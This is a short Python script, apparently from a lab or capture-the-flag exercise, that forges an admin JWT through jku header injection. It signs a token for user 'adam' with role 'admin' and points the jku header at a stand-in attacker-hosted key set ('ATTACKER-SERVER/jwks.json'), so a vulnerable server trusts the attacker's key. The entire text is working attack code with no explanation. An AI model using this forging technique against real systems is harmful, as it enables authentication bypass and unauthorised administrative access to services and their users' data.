import jwt
import time

with open("private.pem", "r") as f:
    private_key = f.read()

payload = {
    "sub": "adam",
    "user_id": 4,
    "role": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}

headers = {
    "alg": "RS256",
    "jku": "https://ATTACKER-SERVER/jwks.json",
    "kid": "052954d043c467a6",
    "typ": "JWT"
}

token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)

print(token)
